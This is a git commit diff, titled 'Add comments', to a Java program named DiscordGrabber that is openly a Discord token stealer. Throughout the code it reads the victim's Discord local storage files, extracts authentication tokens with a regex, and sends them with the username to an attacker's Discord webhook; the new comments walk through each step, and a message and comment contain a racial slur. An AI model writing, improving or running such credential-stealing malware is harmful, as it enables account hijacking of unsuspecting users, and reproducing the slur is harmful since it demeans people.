5d26ce8a99622df05001cc3665bce4e7a82a7cc5
Xefer-0 <45923645+Xefer-0@users.noreply.github.com>
2020-03-24 17:44:22 +0100

    Add comments

--- DiscordGrabber.java
+++ DiscordGrabber.java
@@ -13,55 +13,55 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 public class DiscordGrabber {
 	
-	private static String username = System.getProperty("user.name");
-    private static String DiscordWebhookLink = "";
-    private static String BOTName = "";
-    private static String BOTImageURL = "";
+    private static String username = System.getProperty("user.name"); //Get username to later use in the path
+    private static String DiscordWebhookLink = ""; //Fill in your discord webhook where you want the tokens sent to
+    private static String BOTName = ""; //give the bot a name
+    private static String BOTImageURL = ""; // give the bot a face
 	
 	public static void main(String[] args) throws IOException {
 
-        String os = System.getProperty("os.name");
+        String os = System.getProperty("os.name"); //get os names, because discord is saved in different directories depending on the os
         
         
         
 
-        if(os.contains("Windows")) {
-            String path = System.getProperty("user.home") +"/AppData/Roaming/Discord/Local Storage/leveldb/";;
-            String username = System.getProperty("user.name");
+        if(os.contains("Windows")) { //if it is any type of windows, do this
+            String path = System.getProperty("user.home") +"/AppData/Roaming/Discord/Local Storage/leveldb/"; //Set the path to discord path 
+            String username = System.getProperty("user.name"); 
 
-            String[] pathnames;
+            String[] pathnames; //create an empty array
 
-            File f = new File(path);
+            File f = new File(path); //set file to the path
 
-            pathnames = f.list();
+            pathnames = f.list(); // list all the files in the path (because token is in one of the files)
         	
         	
-        	for (String pathname : pathnames) {
+        	for (String pathname : pathnames) { //iterate through all the files in the path
                 try {
-                    FileInputStream fstream = new FileInputStream(path + pathname);
-                    DataInputStream in = new DataInputStream(fstream);
-                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
-                    String strLine;
-                    while ((strLine = br.readLine()) != null) {
+                    FileInputStream fstream = new FileInputStream(path + pathname); //for reading the file
+                    DataInputStream in = new DataInputStream(fstream); // for reading the file
+                    BufferedReader br = new BufferedReader(new InputStreamReader(in)); //for reading the file
+                    String strLine; //make a new string
+                    while ((strLine = br.readLine()) != null) { //while the token has not been found, read the next line
 
-                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
-                        Matcher m = p.matcher(strLine);
+                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
+                        Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
 
-                        while (m.find()) {
-                    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink);
-                            webhook.setContent(username + "  -  " + m.group());
-                            webhook.setAvatarUrl(BOTImageURL);
-                            webhook.setUsername(BOTName);
-                            webhook.setTts(false);
-                            webhook.execute();
-                        }
+                        while (m.find()) { //everytime a token is found
+                    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink); //this
+                            webhook.setContent(username + "  -  " + m.group()); //gets
+                            webhook.setAvatarUrl(BOTImageURL); //executed
+                            webhook.setUsername(BOTName); //this 
+                            webhook.setTts(false);// just 
+                            webhook.execute(); //sends 
+                        } //it
                     }
 
                 } catch (Exception e) {}
             }
-        }else {
+        }else { //if the token is not found
     		DiscordSender webhook = new DiscordSender(DiscordWebhookLink);
-            webhook.setContent(username + "  -  " + " this nigga uses " + os);
+            webhook.setContent(username + "  -  " + " this nigga uses " + os); //say which os the nigga uses
             webhook.setAvatarUrl(BOTImageURL);
             webhook.setUsername(BOTName);
             webhook.setTts(false);
